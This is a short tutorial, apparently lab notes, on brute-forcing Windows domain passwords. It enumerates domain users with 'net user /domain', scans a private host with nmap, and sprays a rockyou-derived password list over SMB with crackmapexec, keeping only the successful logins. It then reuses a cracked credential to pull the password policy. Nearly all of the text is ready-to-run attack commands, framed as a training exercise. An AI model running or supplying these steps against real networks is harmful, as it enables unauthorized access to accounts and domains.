
# BruteForcing Domain Passwords



## Step 1

Create a linux base machine and clone it and take a snapshot of it as a fresh intall.

Step 2

Create a txt file of all users in the linux, you can check all the username in the workstation by typing ( net user /domain).

Step 3

Save the first 1000-2000 lines of rockyou.txt files in the passwords.txt file and save both the files in the same directory.

Step 4

run a nmap scan to check all the ports running (Ex: nmap -Pn 192.168.16.155).

Step 5

Run crackmapexec -h (to check all the commands)
from the above scan we can see port 445 is open, which is smb so we can run command like this 

(Ex: crackmapexec smb targets.txt -u users.txt -p passwords.txt --continue-on-success | grep '[+]')

(Note: targets.txt contains ip address of the server you can add ip ad of the other also.)

Save the found credentials in a txt file.
After the credentials are found you can do many things like checking the other users and password-policies, etc..

(Ex: crackmapexec smb targets.txt - u abrown -p bubbles --pass-pol)

